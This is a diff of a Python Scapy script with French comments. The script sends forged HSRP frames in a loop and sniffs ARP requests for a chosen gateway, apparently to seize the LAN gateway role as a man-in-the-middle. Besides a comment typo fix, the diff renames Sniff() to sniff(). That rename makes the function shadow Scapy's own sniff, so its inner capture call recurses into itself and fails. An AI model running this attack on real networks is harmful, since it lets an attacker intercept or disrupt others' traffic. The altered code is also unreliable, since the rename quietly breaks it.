@@ -6,7 +6,7 @@ from scapy.layers.l2 import Ether, ARP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.hsrp import HSRP
 
-#Définition des différentes varaibles dont nous allons avoir besoin
+#Définition des différentes variables dont nous allons avoir besoin
 #L'interface connectée au réseau local envoyant des paquets
 interface = "eth0"
 #Adresse IP de l'hôte utilisé comme passerelle - à choisir !
@@ -26,7 +26,7 @@ def frame_hsrp():
     sendp(final_frame_hsrp, iface=interface, inter=2, loop=1)
 
 #Utilisation de Scapy afin d'écouter le trafic ARP
-def Sniff():
+def sniff():
     #Nouvelle fonction appelée à chaque paquet ARP capturé sur le trafic
     def arp(frame):
         #Vérification du paquet si c'est oui ou non une requête ARP, destinée à la passerelle spécifiée précédemment "gateway_ip"
@@ -45,6 +45,3 @@ def Sniff():
     #La fonction arp est appelée pour chaque paquet ARP capturé
     #Appel de la fonction "sniff" pour lancer la capture ARP
     sniff(prn=arp, filter="arp", store=0, iface=interface)
-
-
-
